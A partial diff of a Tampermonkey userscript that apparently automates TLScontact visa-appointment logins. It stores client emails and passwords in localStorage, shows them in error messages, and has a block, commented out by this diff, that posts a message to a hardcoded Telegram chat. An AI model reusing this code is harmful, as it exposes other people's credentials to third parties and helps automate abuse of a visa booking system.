@@ -1,14 +1,14 @@
 // ==UserScript==
 // @name         JYCOSCRIPT RENAISSANCE V1.3
 // @namespace    http://tampermonkey.net/
-// @version      2025-01-22 20:04
+// @version      2025-01-29 04:41
 // @description  try to take over the world!
 // @author       You
 // @match        http://*/*
 // @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
 // @grant        Allah est le Créateur de toute chose, et de toute chose Il est Garant. Il détient les clefs des cieux et de la terre; et ceux qui ne croient pas aux versets d'Allah, ce sont ceux-là les perdants.
 // ==/UserScript==
-var version = "V1.1 2025-01-22 20:04";
+var version = "V1.1 2025-01-29 04:41";
 
 var CLP ;
 var MAXO;
@@ -384,7 +384,7 @@ setTimeout(function () { window.location.href = window.location.href; }, 1e3);
 
 message = "table statut 500 : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) + "\n" + localStorage.getItem("TLS_WEB_issuer") + "\n" +     localStorage.getItem("IP"); ERROR();
         setTimeout(function () {
-            window.location = "https://as2.ftcdn.net/v2/jpg/00/65/14/03/1000_F_65140353_MtK6aWCZzo7w0gauEIk6bZcXKso0drlq.jpg";
+            window.location = "https://digitiz.fr/wp-content/uploads/2022/07/Erreur-500.png";
         }, 5000);
 
    }
@@ -1413,7 +1413,7 @@ applyCodeToSubmit();
 
 
 setTimeout(() => {
-var errormessage = "⚠️⚠️⚠️⚠️⚠️⚠️ Formulaire_OFF" + "\n Email : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"))   + "\n Client : " + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));    
+errormessage = "⚠️⚠️⚠️⚠️⚠️⚠️ Formulaire_OFF" + "\n Email : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"))   + "\n Client : " + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));    
 modal();
 }, 1000);
 }
@@ -1489,15 +1489,17 @@ setTimeout(function() {
 document.querySelector("#kc-login").on("click", function() {
 });
 }
- if((document.body.innerText).indexOf('Invalid username or password.') > -1){ setTimeout(function(){ document.body.style.backgroundColor = "#FFA500"; }, 2000);
+ if((document.body.innerText).indexOf('Invalid username or password.') > -1){ setTimeout(function(){ document.body.style.backgroundColor = "#FFA500"; /* window.location.href = "https://fr.tlscontact.com/application-fees/ma/maCAS2fr";*/ }, 2000);
+                                                                             
+
 setTimeout(() => {
-var errormessage = "⚠️ Invalid username or password. ⚠️" + "\n Email : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"))   + "\n Client : " + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));    
+ errormessage = "⚠️ Invalid username or password. ⚠️" + "\n Email : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"))   + "\n Client : " + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));    
 modal();
 }, 1000);}
     else
  if((document.body.innerText).indexOf("Nom d'utilisateur ou mot de passe invalide.") > -1){ 
      setTimeout(() => {
-var errormessage = "⚠️ Invalid username or password. ⚠️" + "\n Email : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"))   + "\n Client : " + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));    
+ errormessage = "⚠️ Invalid username or password. ⚠️" + "\n Email : " + localStorage.getItem("Email"+localStorage.getItem("TLS_WEB_issuer"))   + "\n Client : " + localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer"));    
 modal();
 }, 1000);  setTimeout(function(){ document.body.style.backgroundColor = "#FFA500"; }, 2000); }
 else  {
@@ -1646,6 +1648,7 @@ document.getElementById("EMAIL").textContent = content;
 document.getElementById("EMAIL").style.whiteSpace = "pre-line";
 document.getElementById("EMAIL").style.textAlign = "left";
 
+    /*
 setTimeout(() => {
 
 const payContent = document.querySelector('.pay_content');
@@ -1690,6 +1693,7 @@ else if ( localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) ===
   xhr.send(JSON.stringify({chat_id: '-1002013849559', text: call, parse_mode: 'html'}));
 }
 }, 5000);
+*/
 
   }
 
